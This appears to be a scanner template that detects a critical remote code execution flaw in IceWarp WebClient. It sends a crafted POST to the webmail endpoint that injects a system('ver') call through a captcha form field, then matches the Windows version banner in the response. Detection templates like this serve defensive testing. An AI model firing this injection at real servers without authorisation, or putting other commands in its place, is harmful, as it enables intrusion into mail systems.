id: icewarp-webclient-rce
brief:
    title: IceWarp WebClient - Remote Code Execution
    by: gy741
    level: critical
    about: IceWarp WebClient is susceptible to remote code execution.
    label:
        - icewarp
        - rce
        - vuln
    score: CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/webmail/basic/'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: _dlg[captcha][target]=system(\'ver\')\
      signs:
        - "on": word
          has:
            - Microsoft Windows [Version
          in: body
          need: all
        - "on": status
          status:
            - 302
